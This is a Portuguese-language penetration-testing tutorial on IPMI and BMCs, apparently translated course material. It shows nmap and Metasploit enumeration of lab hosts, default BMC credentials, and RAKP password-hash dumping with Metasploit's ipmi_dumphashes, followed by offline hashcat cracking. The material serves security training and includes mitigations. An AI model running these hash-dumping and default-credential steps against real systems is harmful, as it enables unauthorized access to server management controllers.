[Interface de gerenciamento inteligente da plataforma](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) é um conjunto de especificações padronizadas para sistemas de gerenciamento de host baseados em hardware usados para gerenciamento e monitoramento de sistemas. Ele atua como um subsistema autônomo e funciona independentemente do BIOS, CPU, firmware e sistema operacional subjacente do host. O IPMI fornece aos administradores de sistemas a capacidade de gerenciar e monitorar sistemas, mesmo que estejam desligados ou em um estado não responsivo. Ele opera usando uma conexão de rede direta ao hardware do sistema e não requer acesso ao sistema operacional por meio de um shell de login. O IPMI também pode ser usado para atualizações remotas nos sistemas sem exigir acesso físico ao host de destino. O IPMI é normalmente usado de três maneiras:

- Antes do sistema operacional inicializar para modificar as configurações do BIOS
- Quando o host está totalmente desligado
- Acesso a um host após uma falha no sistema

Ao não ser usado para essas tarefas, o IPMI pode monitorar uma variedade de coisas diferentes, como temperatura do sistema, tensão, status do ventilador e fontes de alimentação. Também pode ser usado para consultar informações de inventário, revisar registros de hardware e alertar usando o SNMP. O sistema host pode ser desligado, mas o módulo IPMI requer uma fonte de energia e uma conexão LAN para funcionar corretamente.

O protocolo IPMI foi publicado pela Intel em 1998 e agora é suportado por mais de 200 fornecedores de sistemas, incluindo Cisco, Dell, HP, Supermicro, Intel e muito mais. Os sistemas que usam o IPMI versão 2.0 podem ser administrados via serial pela LAN, dando aos administradores de sistemas a capacidade de visualizar a saída do console serial na banda. Para funcionar, o IPMI requer os seguintes componentes:

- Baseboard Management Controller ( BMC ) - Um microcontrolador e componente essencial de um IPMI
- Intelligent Chassis Management Bus ( ICMB ) - Uma interface que permite a comunicação de um chassi para outro
- Intelligent Platform Management Bus ( IPMB ) - estende o BMC
- IPMI Memory - armazena itens como o log de eventos do sistema, dados do repositório e muito mais
- Communications Interfaces - interfaces de sistema local, interfaces seriais e LAN, ICMB e PCI Management Bus

O IPMI se comunica pela porta 623 UDP. Os sistemas que usam o protocolo IPMI são chamados de Baseboard Management Controllers ( BMCs ). Os BMCs geralmente são implementados como sistemas ARM incorporados executando o Linux e conectados diretamente à placa-mãe do host. Os BMCs são incorporados em muitas placas-mãe, mas também podem ser adicionados a um sistema como uma placa PCI. A maioria dos servidores vem com um BMC ou suporta a adição de um BMC. Os BMCs mais comuns que vemos frequentemente durante os testes de penetração interna são HP iLO, Dell DRAC e Supermicro IPMI. Se pudermos acessar um BMC durante uma avaliação, obteremos acesso total à placa-mãe do host e poderemos monitorar, reiniciar, desligar ou até reinstalar o sistema operacional do host. Obter acesso a um BMC é quase equivalente ao acesso físico a um sistema. Muitos BMCs ( incluindo HP iLO, Dell DRAC,e o Supermicro IPMI ) expõe um console de gerenciamento baseado na Web, algum tipo de protocolo de acesso remoto à linha de comando, como Telnet ou SSH, e a porta 623 UDP, que, novamente, é para o protocolo de rede IPMI. Abaixo está uma amostra de verificação do Nmap usando o Nmap [versão ipmi](https://nmap.org/nsedoc/scripts/ipmi-version.html) Script NSE para pegar o serviço.

```shell-session
casluxd@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aqui, podemos ver que o protocolo IPMI está realmente ouvindo na porta 623 e o Nmap imprimiu a versão 2.0 do protocolo. Também podemos usar o módulo do scanner Metasploit [Descoberta de informações do IPMI ( auxiliar / scanner / ipmi / ipmi_version )](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

## Footprinting de versão do Metasploit

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante os testes de penetração interna, geralmente encontramos BMCs onde os administradores não alteraram a senha padrão. Algumas senhas padrão exclusivas para manter em nossas planilhas incluem:

|Produto|Nome de usuário|Senha|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|sequência aleatória de 8 caracteres composta por números e letras maiúsculas|
|IPMI supermicro|ADMIN|ADMIN|

Também é essencial experimentar senhas padrão conhecidas para QUALQUER serviço que descobrimos, pois elas geralmente permanecem inalteradas e podem levar a vitórias rápidas. Ao lidar com BMCs, essas senhas padrão podem nos dar acesso ao console da web ou até mesmo ao acesso à linha de comando via SSH ou Telnet.

## Configurações perigosas

Se as credenciais padrão não funcionarem para acessar um BMC, podemos recorrer a um [falha](http://fish2.com/ipmi/remote-pw-cracking.html) no protocolo RAKP no IPMI 2.0. Durante o processo de autenticação, o servidor envia um hash SHA1 ou MD5 salted da senha do usuário ao cliente antes que a autenticação ocorra. Isso pode ser aproveitado para obter o hash da senha para QUALQUER conta de usuário válida no BMC. Esses hashes de senha podem ser quebrados offline usando um ataque de dicionário usando `Hashcat` modo `7300`. No caso de um HP iLO usando uma senha padrão de fábrica, podemos usar este comando de ataque de máscara Hashcat `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` que tenta todas as combinações de letras maiúsculas e números para uma senha de oito caracteres.

Não há "correção" direta a esse problema porque a falha é um componente crítico da especificação IPMI. Os clientes podem optar por senhas muito longas e difíceis de quebrar ou implementar regras de segmentação de rede para restringir o acesso direto aos BMCs. É importante não ignorar o IPMI durante os testes de penetração interna (, nós o vemos durante a maioria das avaliações ), porque não apenas podemos obter acesso ao console da web da BMC, que é uma descoberta de alto risco, mas vimos ambientes em que uma senha exclusiva (, mas quebrável ), é definida e posteriormente reutilizada em outros sistemas. Em um desses testes de penetração, obtivemos um hash IPMI, quebramos offline usando Hashcat, e foram capazes de SSH em muitos servidores críticos no ambiente como usuário root e obter acesso a consoles de gerenciamento da web para várias ferramentas de monitoramento de rede.

Para recuperar hashes IPMI, podemos usar o módulo Metasploit [Recuperação remota de hash de senha SHA1 do IPMI 2.0 RAKP](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) .

#### Hastes de despejo de metasploit

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Aqui podemos ver que obtivemos com sucesso a senha hash para o usuário `ADMIN`, e a ferramenta conseguiu decifrá-lo rapidamente para revelar o que parece ser uma senha padrão `ADMIN`. A partir daqui, poderíamos tentar fazer login no BMC ou, se a senha fosse algo mais exclusivo, verifique se a senha foi reutilizada em outros sistemas. O IPMI é muito comum em ambientes de rede, pois os administradores de sistemas precisam acessar servidores remotamente em caso de interrupção ou executar determinadas tarefas de manutenção que tradicionalmente teriam que estar fisicamente na frente do servidor para concluir. Essa facilidade de administração corre o risco de expor hashes de senha a qualquer pessoa na rede e pode levar a acesso não autorizado, interrupção do sistema e até execução remota de código. A verificação do IPMI deve fazer parte do nosso manual de testes de penetração interna para qualquer ambiente que nos avaliarmos.

# Resumo

O IPMI (Intelligent Platform Management Interface) é um protocolo de gerenciamento remoto utilizado em servidores e sistemas de computador. Ele fornece uma interface padronizada para monitorar, controlar e gerenciar remotamente o hardware e os componentes de um sistema, independentemente do sistema operacional em execução.

O IPMI é projetado para permitir que administradores de sistemas acessem remotamente servidores, mesmo que eles estejam desligados ou com falhas críticas de software. Ele opera em uma camada de hardware independente do sistema operacional e é implementado através de um módulo de gerenciamento de baseboard (BMC - Baseboard Management Controller), que é um chip dedicado ou um componente integrado na placa-mãe do servidor.

O protocolo IPMI permite monitorar vários aspectos do hardware do servidor, como temperatura, voltagem, status dos ventiladores, uso de energia e status dos discos rígidos. Ele também permite controlar remotamente funções como ligar/desligar o servidor, redefinir o servidor, ligar/desligar ventiladores e abrir/fechar unidades de CD/DVD.

O IPMI possui uma arquitetura cliente-servidor. Os clientes IPMI podem ser softwares de gerenciamento específicos, interfaces web ou utilitários de linha de comando. Esses clientes se comunicam com o BMC do servidor através de uma rede de gerenciamento, geralmente usando o protocolo de rede padrão, como o Ethernet. O BMC responde às solicitações do cliente e executa as ações solicitadas no hardware do servidor.

Uma das vantagens do IPMI é que ele pode ser usado em várias plataformas e sistemas operacionais, fornecendo uma interface consistente de gerenciamento remoto. Ele é amplamente suportado por muitos fabricantes de servidores e é uma ferramenta valiosa para monitorar e gerenciar remotamente servidores em um data center ou em ambientes distribuídos.

Porta padrão: 623/udp

